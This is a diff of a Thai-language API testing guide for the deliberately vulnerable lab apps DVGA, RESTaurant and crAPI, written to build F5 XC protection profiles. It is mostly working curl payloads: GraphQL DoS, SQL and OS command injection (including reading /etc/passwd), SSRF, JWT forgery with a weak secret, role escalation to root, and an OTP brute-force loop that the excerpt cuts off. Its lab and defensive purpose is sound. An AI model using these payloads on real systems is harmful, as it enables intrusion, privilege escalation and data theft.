@@ -1,9 +1,9 @@
 ---
 title: คู่มือการทดสอบ API
 description: >-
-  แค็ตตาล็อก endpoint ครบถ้วน, การจับคู่ช่องโหว่, และ attack payload สำหรับ
-  DVGA, RESTaurant, และ crAPI — เอกสารอ้างอิงสำหรับการสร้างทราฟฟิกและการพัฒนา F5
-  XC API protection profile
+  แคตตาล็อก endpoint ครอบคลุม การจัดทำแผนที่ช่องโหว่ และ payload
+  สำหรับการโจมตีใน DVGA, RESTaurant และ crAPI —
+  เอกสารอ้างอิงสำหรับการสร้างทราฟฟิกและการพัฒนาโปรไฟล์การป้องกัน API ของ F5 XC
 sidebar:
   order: 8
 i18n:
@@ -13,9 +13,9 @@ i18n:
 
 ## ภาพรวม
 
-คู่มือนี้รวบรวมแค็ตตาล็อกของทุก API endpoint, ช่องโหว่ที่ตั้งใจสร้างไว้ และ attack payload ข้ามแอปพลิเคชันทดสอบความปลอดภัย API ทั้งสาม ใช้เพื่อสร้างรูปแบบการสร้างทราฟฟิกสำหรับการพัฒนา F5 XC API protection profile
+คู่มือนี้จัดทำแคตตาล็อก API endpoint ทุกรายการ ช่องโหว่ที่ตั้งใจสร้างขึ้น และ payload สำหรับการโจมตีในแอปพลิเคชันทดสอบความปลอดภัย API ทั้งสามรายการ ใช้คู่มือนี้เพื่อสร้างรูปแบบการสร้างทราฟฟิกสำหรับการพัฒนาโปรไฟล์การป้องกัน API ของ F5 XC
 
-| แอปพลิเคชัน | โปรโตคอล | เส้นทาง | พอร์ต | การยืนยันตัวตน | ช่องโหว่ |
+| แอปพลิเคชัน | โปรโตคอล | Path | พอร์ต | การยืนยันตัวตน | ช่องโหว่ |
 |---|---|---|---|---|---|
 | **DVGA** | GraphQL | `/dvga/` | 80 | ไม่มี (admin: admin/password) | 25 สถานการณ์ |
 | **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 หมวดหมู่ OWASP API 2023 |
@@ -34,9 +34,9 @@ CRAPI="http://<ORIGIN_IP>:8888"
 
 **GraphQL Endpoint:** `POST ${ORIGIN}/dvga/graphql`
 **GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
-**ข้อมูลรับรอง Admin:** admin / password
+**ข้อมูลรับรองผู้ดูแลระบบ:** admin / password
 
-การโต้ตอบกับ DVGA ทั้งหมดใช้ endpoint เดียว (`/dvga/graphql`) ด้วย POST request ที่มี JSON `{"query":"..."}` เป็น payload
+การโต้ตอบกับ DVGA ทั้งหมดใช้ endpoint เดียว (`/dvga/graphql`) ผ่านคำร้องขอ POST ที่มี payload JSON `{"query":"..."}` 
 
 ### ภาพรวม Schema
 
@@ -47,53 +47,53 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
           OwnerObject (id, username, pastes)  ← circular reference
 ```
 
-### รายการอ้างอิง Endpoint
+### เอกสารอ้างอิง Endpoint
 
-| ปฏิบัติการ | ชนิด | การยืนยันตัวตน | วัตถุประสงค์ |
+| การดำเนินการ | ประเภท | การยืนยันตัวตน | วัตถุประสงค์ |
 |---|---|---|---|
-| `pastes(public, filter, limit)` | Query | ไม่ | แสดงรายการ paste (SQL injection ผ่าน filter) |
-| `paste(id)` | Query | ไม่ | ดึง paste เดี่ยว |
-| `me(token)` | Query | ไม่ | ดึงข้อมูลผู้ใช้ด้วย JWT (เสี่ยงต่อการปลอมแปลง) |
-| `systemHealth` | Query | ไม่ | ตรวจสอบสุขภาพระบบ |
-| `systemUpdate` | Query | ไม่ | คิวรีช้า (~82 วินาที, เวกเตอร์ DoS) |
-| `systemDiagnostics(cmd)` | Query | admin/password | เรียกใช้คำสั่ง OS ที่อยู่ใน whitelist |
-| `createPaste(title, content, public)` | Mutation | ไม่ | สร้าง paste (XSS ผ่าน content) |
-| `importPaste(host, port, path, scheme)` | Mutation | ไม่ | นำเข้า paste จากระยะไกล (SSRF, command injection) |
-| `uploadPaste(filename, content)` | Mutation | ไม่ | อัปโหลด paste (path traversal) |
+| `pastes(public, filter, limit)` | Query | ไม่ใช้ | แสดงรายการ paste (SQL injection ผ่าน filter) |
+| `paste(id)` | Query | ไม่ใช้ | ดึง paste รายการเดียว |
+| `me(token)` | Query | ไม่ใช้ | ดึงผู้ใช้ด้วย JWT (มีช่องโหว่การปลอมแปลง) |
+| `systemHealth` | Query | ไม่ใช้ | ตรวจสอบสถานะ |
+| `systemUpdate` | Query | ไม่ใช้ | Query ช้า (~82 วินาที, เป็นเวกเตอร์ DoS) |
+| `systemDiagnostics(cmd)` | Query | admin/password | รันคำสั่ง OS ที่อยู่ใน whitelist |
+| `createPaste(title, content, public)` | Mutation | ไม่ใช้ | สร้าง paste (XSS ผ่าน content) |
+| `importPaste(host, port, path, scheme)` | Mutation | ไม่ใช้ | นำเข้า paste จากระยะไกล (SSRF, command injection) |
+| `uploadPaste(filename, content)` | Mutation | ไม่ใช้ | อัปโหลด paste (path traversal) |
 
-### แค็ตตาล็อกช่องโหว่
+### แคตตาล็อกช่องโหว่
 
-#### 1. การปฏิเสธบริการ (6 สถานการณ์)
+#### 1. การโจมตีแบบ Denial of Service (6 สถานการณ์)
 
-**การโจมตี Batch Query:**
+**การโจมตีด้วย Batch Query:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
 ```
 
-**การเรียกซ้ำลึก (circular Owner/Paste references):**
+**Deep Recursion (การอ้างอิงแบบวงกลมระหว่าง Owner/Paste):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
 ```
 
-**คิวรีใช้ทรัพยากรสูง (ตอบสนอง ~82 วินาที):**
+**Query ที่ใช้ทรัพยากรมาก (~82 วินาทีในการตอบสนอง):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{systemUpdate}"}'
 ```
 
-**การทำซ้ำฟิลด์ (ทำซ้ำฟิลด์ 500+ ครั้ง):**
+**การซ้ำซ้อนของฟิลด์ (ทำซ้ำฟิลด์มากกว่า 500 ครั้ง):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**การโจมตีแบบ Alias (1000 aliased operations):**
+**การโจมตีด้วย Alias (การดำเนินการที่มี alias 1000 รายการ):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -102,28 +102,28 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 2. การเปิดเผยข้อมูล (5 สถานการณ์)
 
-**Introspection (การแจกแจง schema ทั้งหมด):**
+**Introspection (การระบุ schema ทั้งหมด):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**คำแนะนำฟิลด์ (พิมพ์ผิดเปิดเผยฟิลด์ที่ถูกต้อง):**
+**Field Suggestions (การพิมพ์ผิดเปิดเผยฟิลด์ที่ถูกต้อง):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{titl}}"}'
 ```
 
-**SSRF ผ่าน importPaste (สำรวจบริการภายใน):**
+**SSRF ผ่าน importPaste (ตรวจสอบบริการภายใน):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
 ```
 
-#### 3. การฉีด (4 สถานการณ์)
+#### 3. Injection (4 สถานการณ์)
 
 **SQL Injection ผ่านพารามิเตอร์ filter:**
 ```bash
@@ -139,14 +139,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
 ```
 
-**Log Injection (การปลอมชื่อ operation):**
+**Log Injection (การปลอมแปลงชื่อ operation):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
 ```
 
-#### 4. การเรียกใช้โค้ด (3 สถานการณ์)
+#### 4. การรันโค้ด (3 สถานการณ์)
 
 **OS Command Injection ผ่าน importPaste:**
 ```bash
@@ -155,23 +155,23 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
 ```
 
-**OS Command ผ่าน systemDiagnostics (ต้องใช้การยืนยันตัวตน admin):**
+**OS Command ผ่าน systemDiagnostics (ต้องใช้การยืนยันตัวตนของผู้ดูแลระบบ):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
 ```
 
-#### 5. การข้ามการอนุญาต (3 สถานการณ์)
+#### 5. การข้ามการยืนยันสิทธิ์ (3 สถานการณ์)
 
-**การปลอมแปลง JWT Token (ยอมรับ token ที่ไม่ได้ลงนาม):**
+**การปลอมแปลง JWT Token (ยอมรับ token ที่ไม่มีลายเซ็น):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
 ```
 
-**การเขียนไฟล์ตามอำเภอใจผ่าน uploadPaste (path traversal):**
+**การเขียนไฟล์โดยพลการผ่าน uploadPaste (path traversal):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -195,7 +195,7 @@ curl -X POST ${ORIGIN}/restaurant/register \
   -H "Content-Type: application/json" \
   -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'
 
-# รับ JWT token (หมายเหตุ: form-encoded ไม่ใช่ JSON)
+# รับ JWT token (หมายเหตุ: ใช้ form-encoded ไม่ใช่ JSON)
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
@@ -203,37 +203,37 @@ TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
 echo "Bearer token: ${TOKEN}"
 ```
 
-### รายการอ้างอิง Endpoint
+### เอกสารอ้างอิง Endpoint
 
-| Endpoint | เมธอด | การยืนยันตัวตน | บทบาท | ช่องโหว่ |
+| Endpoint | Method | การยืนยันตัวตน | บทบาท | ช่องโหว่ |
 |---|---|---|---|---|
-| `/restaurant/register` | POST | ไม่ | — | การสร้างผู้ใช้ |
-| `/restaurant/token` | POST | ไม่ | — | JWT พร้อม secret อ่อนแอ (97952) |
-| `/restaurant/healthcheck` | GET | ไม่ | — | ตรวจสอบสุขภาพระบบ |
-| `/restaurant/profile` | GET | ใช่ | ทุกบทบาท | โปรไฟล์ผู้ใช้ |
-| `/restaurant/profile` | PUT | ใช่ | ทุกบทบาท | **BOLA** (แก้ไขผู้ใช้คนอื่น) |
-| `/restaurant/profile` | PATCH | ใช่ | ทุกบทบาท | **BOPLA** (กำหนดบทบาทแบบ mass) |
-| `/restaurant/users/update_role` | PUT | ใช่ | ทุกบทบาท | **BFLA** (การยกระดับบทบาท) |
-| `/restaurant/menu` | GET | ใช่ | ทุกบทบาท | แสดงรายการเมนู |
-| `/restaurant/menu` | PUT | ใช่ | Employee+ | สร้างเมนู (**SSRF** ผ่าน image) |
-| `/restaurant/menu/{item_id}` | PUT | ใช่ | Employee+ | อัปเดตเมนู (**SSRF** ผ่าน image) |
-| `/restaurant/menu/{item_id}` | DELETE | ใช่ | ทุกบทบาท | **BFLA** (ผู้ใช้ใดก็ได้สามารถลบได้) |
-| `/restaurant/orders` | GET | ใช่ | ทุกบทบาท | **BOLA** (ดูคำสั่งซื้อทั้งหมด) |
-| `/restaurant/orders` | POST | ใช่ | ทุกบทบาท | สร้างคำสั่งซื้อ |
-| `/restaurant/orders/{order_id}` | GET | ใช่ | ทุกบทบาท | **BOLA** (เข้าถึงคำสั่งซื้อคนอื่น) |
-| `/restaurant/orders/status/{order_id}` | GET | ใช่ | ทุกบทบาท | สถานะคำสั่งซื้อ |
-| `/restaurant/admin/stats/disk` | GET | ใช่ | Chef | **Command injection** |
-| `/restaurant/reset-password` | POST | ไม่ | — | คำขอรีเซ็ตรหัสผ่าน |
-| `/restaurant/reset-password/new-password` | POST | ไม่ | — | ตั้งรหัสผ่านใหม่ |
-| `/restaurant/referral-code` | GET | ใช่ | ทุกบทบาท | รับรหัสอ้างอิง |
-| `/restaurant/apply-referral` | POST | ใช่ | ทุกบทบาท | ใช้รหัสอ้างอิง |
-| `/restaurant/discount-coupons` | GET | ใช่ | ทุกบทบาท | แสดงรายการคูปอง |
+| `/restaurant/register` | POST | ไม่ใช้ | — | การสร้างผู้ใช้ |
+| `/restaurant/token` | POST | ไม่ใช้ | — | JWT ที่มี secret อ่อนแอ (97952) |
+| `/restaurant/healthcheck` | GET | ไม่ใช้ | — | ตรวจสอบสถานะ |
+| `/restaurant/profile` | GET | ใช้ | Any | โปรไฟล์ผู้ใช้ |
+| `/restaurant/profile` | PUT | ใช้ | Any | **BOLA** (แก้ไขผู้ใช้รายอื่น) |
+| `/restaurant/profile` | PATCH | ใช้ | Any | **BOPLA** (กำหนด role แบบ mass assign) |
+| `/restaurant/users/update_role` | PUT | ใช้ | Any | **BFLA** (การยกระดับบทบาท) |
+| `/restaurant/menu` | GET | ใช้ | Any | แสดงรายการเมนู |
+| `/restaurant/menu` | PUT | ใช้ | Employee+ | สร้างเมนู (**SSRF** ผ่าน image) |
+| `/restaurant/menu/{item_id}` | PUT | ใช้ | Employee+ | อัปเดตเมนู (**SSRF** ผ่าน image) |
+| `/restaurant/menu/{item_id}` | DELETE | ใช้ | Any | **BFLA** (ผู้ใช้ใดก็สามารถลบได้) |
+| `/restaurant/orders` | GET | ใช้ | Any | **BOLA** (ดูคำสั่งซื้อทั้งหมด) |
+| `/restaurant/orders` | POST | ใช้ | Any | สร้างคำสั่งซื้อ |
+| `/restaurant/orders/{order_id}` | GET | ใช้ | Any | **BOLA** (เข้าถึงคำสั่งซื้อของผู้อื่น) |
+| `/restaurant/orders/status/{order_id}` | GET | ใช้ | Any | สถานะคำสั่งซื้อ |
+| `/restaurant/admin/stats/disk` | GET | ใช้ | Chef | **Command injection** |
+| `/restaurant/reset-password` | POST | ไม่ใช้ | — | คำร้องขอรีเซ็ตรหัสผ่าน |
+| `/restaurant/reset-password/new-password` | POST | ไม่ใช้ | — | ตั้งรหัสผ่านใหม่ |
+| `/restaurant/referral-code` | GET | ใช้ | Any | รับรหัสแนะนำ |
+| `/restaurant/apply-referral` | POST | ใช้ | Any | ใช้รหัสแนะนำ |
+| `/restaurant/discount-coupons` | GET | ใช้ | Any | แสดงรายการคูปอง |
 
-### แค็ตตาล็อกช่องโหว่
+### แคตตาล็อกช่องโหว่
 
 #### API1:2023 — Broken Object Level Authorization (BOLA)
 
-**แก้ไขโปรไฟล์ผู้ใช้คนอื่น:**
+**แก้ไขโปรไฟล์ของผู้ใช้รายอื่น:**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -241,7 +241,7 @@ curl -X PUT ${ORIGIN}/restaurant/profile \
   -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
 ```
 
-**เข้าถึงคำสั่งซื้อผู้ใช้คนอื่น (แจกแจง offset):**
+**เข้าถึงคำสั่งซื้อของผู้ใช้รายอื่น (ระบุ offset แบบลำดับ):**
 ```bash
 for i in 1 2 3 4 5; do
   curl -sf ${ORIGIN}/restaurant/orders/${i} \
@@ -250,22 +250,22 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### API2:2023 — การยืนยันตัวตนที่เสียหาย
+#### API2:2023 — Broken Authentication
 
-**การ brute-force JWT weak secret (secret เป็น 6 หลัก: 97952):**
+**การ brute-force ด้วย JWT secret อ่อนแอ (secret คือ 6 หลัก: 97952):**
 ```bash
 # ถอดรหัสและปลอมแปลง token ที่ jwt.io
-# Secret: 97952 (brute-force ได้ด้วย hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')
+# Secret: 97952 (brute-forceable with hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')
 
 # ปลอมแปลง Chef token:
 # Header: {"alg":"HS256","typ":"JWT"}
 # Payload: {"sub":"chef","exp":9999999999}
-# ลงนามด้วย secret: 97952
+# Sign with secret: 97952
 ```
 
 #### API3:2023 — Broken Object Property Level Authorization (BOPLA)
 
-**กำหนดบทบาทแบบ mass จาก Customer เป็น Chef:**
+**กำหนด role จาก Customer เป็น Chef แบบ mass-assign:**
 ```bash
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -290,13 +290,13 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
 
 #### API5:2023 — Broken Function Level Authorization (BFLA)
 
-**ลบรายการเมนูในฐานะ Customer (ควรต้องเป็น Employee+):**
+**ลบรายการเมนูในฐานะ Customer (ควรต้องใช้ Employee+):**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-**เปลี่ยนบทบาทผู้ใช้คนอื่น:**
+**เปลี่ยน role ของผู้ใช้รายอื่น:**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/users/update_role \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -306,7 +306,7 @@ curl -X PUT ${ORIGIN}/restaurant/users/update_role \
 
 #### API7:2023 — Server-Side Request Forgery (SSRF)
 
-**สำรวจ endpoint ภายในผ่าน menu image_url (ต้องใช้บทบาท Employee):**
+**ตรวจสอบ endpoint ภายในผ่าน image_url ของเมนู (ต้องใช้บทบาท Employee):**
 ```bash
 # ยกระดับเป็น Employee ผ่าน BOPLA ก่อน จากนั้น:
 curl -X PUT ${ORIGIN}/restaurant/menu \
@@ -315,9 +315,9 @@ curl -X PUT ${ORIGIN}/restaurant/menu \
   -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
 ```
 
-#### API8:2023 — การฉีด
+#### API8:2023 — Injection
 
-**OS Command Injection ผ่าน disk stats (ต้องใช้บทบาท Chef):**
+**OS Command Injection ผ่านสถิติดิสก์ (ต้องใช้บทบาท Chef):**
 ```bash
 # หลังจากยกระดับเป็น Chef:
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
@@ -327,7 +327,7 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### ห่วงโซ่การโจมตีแบบเต็มรูปแบบ: จาก Customer สู่ Root
+### ห่วงโซ่การโจมตีแบบสมบูรณ์: Customer ถึง Root
 
 ```bash
 # 1. ลงทะเบียน
@@ -345,7 +345,7 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Content-Type: application/json" \
   -d '{"role":"Chef"}'
 
-# 4. ยืนยันตัวตนอีกครั้งเพื่อรับ token ระดับ Chef
+# 4. ยืนยันตัวตนใหม่เพื่อรับ token ระดับ Chef
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
@@ -359,11 +359,11 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
 ## crAPI (OWASP Completely Ridiculous API)
 
 **Web UI:** `${CRAPI}/`
-**MailHog:** `${CRAPI}/mailhog/` (ดักจับอีเมลสำหรับการตรวจสอบ)
-**การยืนยันตัวตน:** JWT Bearer token (RS256, เสี่ยงต่อ algorithm confusion)
+**MailHog:** `${CRAPI}/mailhog/` (รับอีเมลสำหรับการยืนยัน)
+**การยืนยันตัวตน:** JWT Bearer token (RS256, มีช่องโหว่จาก algorithm confusion)
 **สถาปัตยกรรม:** 7 microservices (identity, community, workshop, postgres, mongo, mailhog, web)
 
-### การตั้งค่า: ลงทะเบียน, ยืนยันอีเมล, เข้าสู่ระบบ
+### การตั้งค่า: ลงทะเบียน ยืนยันอีเมล และเข้าสู่ระบบ
 
 ```bash
 # 1. ลงทะเบียน
@@ -372,7 +372,7 @@ curl -X POST ${CRAPI}/identity/api/auth/signup \
   -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'
 
 # 2. ตรวจสอบ MailHog สำหรับอีเมลยืนยัน
-# เปิดเบราว์เซอร์ไปที่ ${CRAPI}/mailhog/ หรือใช้ MailHog API:
+# เปิด ${CRAPI}/mailhog/ หรือใช้ MailHog API:
 curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
 import sys,json
 msgs = json.load(sys.stdin)['items']
@@ -388,67 +388,67 @@ TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
 echo "Bearer token: ${TOKEN}"
 ```
 
-### รายการอ้างอิง Endpoint
+### เอกสารอ้างอิง Endpoint
 
-#### บริการ Identity
+#### Identity Service
 
-| Endpoint | เมธอด | การยืนยันตัวตน | ช่องโหว่ |
+| Endpoint | Method | การยืนยันตัวตน | ช่องโหว่ |
 |---|---|---|---|
-| `/identity/api/auth/signup` | POST | ไม่ | การลงทะเบียน |
-| `/identity/api/auth/login` | POST | ไม่ | JWT token (algorithm confusion) |
-| `/identity/api/auth/forget-password` | POST | ไม่ | ขอ OTP |
-| `/identity/api/auth/v2/check-otp` | POST | ไม่ | **ไม่มี rate limit** (brute-force OTP 4 หลัก) |
-| `/identity/api/auth/v3/check-otp` | POST | ไม่ | เวอร์ชันที่มี rate limit |
-| `/identity/api/v2/user/dashboard` | GET | ใช่ | โปรไฟล์ผู้ใช้ |
-| `/identity/api/v2/user/change-email` | PUT | ใช่ | เปลี่ยนอีเมล |
-| `/identity/api/v2/vehicle/vehicles` | GET | ใช่ | แสดงรายการยานพาหนะ (รั่วไหล UUID) |
-| `/identity/api/v2/vehicle/{uuid}/location` | GET | ใช่ | **BOLA** (ยานพาหนะของผู้ใช้คนใดก็ได้) |
-| `/identity/api/v2/user/videos` | POST | ใช่ | อัปโหลดวิดีโอ |
-| `/identity/api/v2/user/videos/{id}` | GET | ใช่ | **การเปิดเผยข้อมูล** (conversion_params) |
-| `/identity/api/v2/user/videos/{id}` | PUT | ใช่ | **Mass assignment** (command injection) |
-| `/identity/api/v2/admin/videos/{id}` | DELETE | ใช่ | **BFLA** (ไม่ตรวจสอบ admin) |
+| `/identity/api/auth/signup` | POST | ไม่ใช้ | การลงทะเบียน |
+| `/identity/api/auth/login` | POST | ไม่ใช้ | JWT token (algorithm confusion) |
+| `/identity/api/auth/forget-password` | POST | ไม่ใช้ | ขอ OTP |
+| `/identity/api/auth/v2/check-otp` | POST | ไม่ใช้ | **ไม่มีการจำกัดอัตรา** (brute-force OTP 4 หลัก) |
+| `/identity/api/auth/v3/check-otp` | POST | ไม่ใช้ | เวอร์ชันที่มีการจำกัดอัตรา |
+| `/identity/api/v2/user/dashboard` | GET | ใช้ | โปรไฟล์ผู้ใช้ |
+| `/identity/api/v2/user/change-email` | PUT | ใช้ | การเปลี่ยนอีเมล |
+| `/identity/api/v2/vehicle/vehicles` | GET | ใช้ | แสดงรายการยานพาหนะ (รั่วไหล UUID) |
+| `/identity/api/v2/vehicle/{uuid}/location` | GET | ใช้ | **BOLA** (ยานพาหนะของผู้ใช้ใดก็ได้) |
+| `/identity/api/v2/user/videos` | POST | ใช้ | อัปโหลดวิดีโอ |
+| `/identity/api/v2/user/videos/{id}` | GET | ใช้ | **การเปิดเผยข้อมูล** (conversion_params) |
+| `/identity/api/v2/user/videos/{id}` | PUT | ใช้ | **Mass assignment** (command injection) |
+| `/identity/api/v2/admin/videos/{id}` | DELETE | ใช้ | **BFLA** (ไม่มีการตรวจสอบ admin) |
 
-#### บริการ Community
+#### Community Service
 
-| Endpoint | เมธอด | การยืนยันตัวตน | ช่องโหว่ |
+| Endpoint | Method | การยืนยันตัวตน | ช่องโหว่ |
 |---|---|---|---|
-| `/community/api/v2/community/posts` | GET | ใช่ | **การเปิดเผยข้อมูล** (รั่วไหล vehicle_id, email) |
-| `/community/api/v2/community/posts` | POST | ใช่ | สร้างโพสต์บล็อก |
-| `/community/api/v2/community/posts/{id}/comments` | POST | ใช่ | เพิ่มความคิดเห็น |
-| `/community/api/v2/coupon/validate-coupon` | POST | ใช่ | **NoSQL injection** |
+| `/community/api/v2/community/posts` | GET | ใช้ | **การเปิดเผยข้อมูล** (รั่วไหล vehicle_id, email) |
+| `/community/api/v2/community/posts` | POST | ใช้ | สร้าง blog post |
+| `/community/api/v2/community/posts/{id}/comments` | POST | ใช้ | เพิ่มความคิดเห็น |
+| `/community/api/v2/coupon/validate-coupon` | POST | ใช้ | **NoSQL injection** |
 
-#### บริการ Workshop
+#### Workshop Service
 
-| Endpoint | เมธอด | การยืนยันตัวตน | ช่องโหว่ |
+| Endpoint | Method | การยืนยันตัวตน | ช่องโหว่ |
 |---|---|---|---|
-| `/workshop/api/mechanic` | GET | ใช่ | **การเปิดเผยข้อมูล** (อีเมลช่าง) |
-| `/workshop/api/mechanic/mechanic_report` | GET | ไม่ | **BOLA** (ไม่มีการยืนยันตัวตน, ID ต่อเนื่อง) |
-| `/workshop/api/merchant/contact_mechanic` | POST | ใช่ | **SSRF** + **DoS** |
-| `/workshop/api/shop/products` | GET | ใช่ | แค็ตตาล็อกสินค้า |
-| `/workshop/api/shop/orders/` | POST | ใช่ | สร้างคำสั่งซื้อ |
-| `/workshop/api/shop/orders/all` | GET | ใช่ | แสดงรายการคำสั่งซื้อ |
-| `/workshop/api/shop/orders/{id}` | GET | ไม่ | **BOLA** (ไม่ต้องยืนยันตัวตน) |
-| `/workshop/api/shop/orders/{id}` | PUT | ใช่ | **Mass assignment** (status, quantity) |
-| `/workshop/api/shop/apply_coupon` | POST | ใช่ | **SQL injection** |
+| `/workshop/api/mechanic` | GET | ใช้ | **การเปิดเผยข้อมูล** (อีเมลช่างซ่อม) |
+| `/workshop/api/mechanic/mechanic_report` | GET | ไม่ใช้ | **BOLA** (ไม่มีการยืนยันตัวตน, ID แบบลำดับ) |
+| `/workshop/api/merchant/contact_mechanic` | POST | ใช้ | **SSRF** + **DoS** |
+| `/workshop/api/shop/products` | GET | ใช้ | แคตตาล็อกสินค้า |
+| `/workshop/api/shop/orders/` | POST | ใช้ | สร้างคำสั่งซื้อ |
+| `/workshop/api/shop/orders/all` | GET | ใช้ | แสดงรายการคำสั่งซื้อ |
+| `/workshop/api/shop/orders/{id}` | GET | ไม่ใช้ | **BOLA** (ไม่ต้องการการยืนยันตัวตน) |
+| `/workshop/api/shop/orders/{id}` | PUT | ใช้ | **Mass assignment** (status, quantity) |
+| `/workshop/api/shop/apply_coupon` | POST | ใช้ | **SQL injection** |
 
-### แค็ตตาล็อกความท้าทาย
+### แคตตาล็อกความท้าทาย
 
-#### ความท้าทายที่ 1 — BOLA: เข้าถึงตำแหน่งยานพาหนะของผู้ใช้คนอื่น
+#### ความท้าทายที่ 1 — BOLA: เข้าถึงตำแหน่งยานพาหนะของผู้ใช้รายอื่น
 
 ```bash
-# ดึง UUID ยานพาหนะของคุณก่อน
+# รับ vehicle UUID ของคุณก่อน
 curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
   -H "Authorization: Bearer ${TOKEN}"
 
-# เข้าถึงยานพาหนะของผู้ใช้คนอื่น (แทนที่ UUID)
+# เข้าถึงยานพาหนะของผู้ใช้รายอื่น (แทนที่ UUID)
 curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### ความท้าทายที่ 2 — BOLA: เข้าถึงรายงานช่าง (ไม่ต้องยืนยันตัวตน)
+#### ความท้าทายที่ 2 — BOLA: เข้าถึงรายงานช่างซ่อม (ไม่ต้องการการยืนยันตัวตน)
 
 ```bash
-# การแจกแจง ID แบบต่อเนื่อง — ไม่ต้องใช้ token
+# การระบุ ID แบบลำดับ — ไม่ต้องใช้ token
 for i in 1 2 3 4 5; do
   echo "Report $i:"
   curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
@@ -456,7 +456,7 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### ความท้าทายที่ 3 — การยืนยันตัวตนที่เสียหาย: Brute-Force OTP รีเซ็ตรหัสผ่าน
+#### ความท้าทายที่ 3 — Broken Auth: Brute-Force OTP สำหรับรีเซ็ตรหัสผ่าน
 
 ```bash
 # ขอ OTP สำหรับเหยื่อ
@@ -464,7 +464,7 @@ curl -X POST ${CRAPI}/identity/api/auth/forget-password \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
 
-# Brute-force OTP 4 หลัก (v2 ไม่มี rate limiting)
+# Brute-force OTP 4 หลัก (v2 ไม่มีการจำกัดอัตรา)
 for otp in $(seq -w 0000 9999); do
